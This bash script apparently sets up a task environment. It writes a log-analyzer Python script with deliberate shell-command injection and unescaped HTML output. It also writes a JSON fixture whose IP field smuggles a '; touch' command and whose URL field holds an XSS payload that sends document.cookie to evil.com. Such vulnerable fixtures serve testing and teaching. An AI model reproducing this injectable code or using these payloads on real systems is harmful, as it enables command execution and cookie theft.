#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip dnsutils
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    cat << 'EOF' > /home/user/traffic_logs.json
[
    {
        "ip": "8.8.8.8",
        "url": "/index.html"
    },
    {
        "ip": "1.1.1.1; touch /home/user/pwned_file",
        "url": "<script>fetch('http://evil.com/?cookie='+document.cookie)</script>"
    }
]
EOF

    cat << 'EOF' > /home/user/log_analyzer.py
import json
import subprocess

def analyze_logs():
    with open('/home/user/traffic_logs.json', 'r') as f:
        logs = json.load(f)

    html_content = "<html><body><h1>Traffic Report</h1><ul>\n"

    for entry in logs:
        ip = entry.get('ip', '')
        url = entry.get('url', '')

        # Vulnerable command execution
        try:
            cmd = f"nslookup {ip}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            lookup_status = "Success" if result.returncode == 0 else "Failed"
        except Exception:
            lookup_status = "Error"

        # Vulnerable HTML generation
        html_content += f"<li>IP: {ip} (Lookup: {lookup_status}) - URL: {url}</li>\n"

    html_content += "</ul></body></html>"

    with open('/home/user/report.html', 'w') as f:
        f.write(html_content)

if __name__ == "__main__":
    analyze_logs()
EOF

    chmod -R 777 /home/user
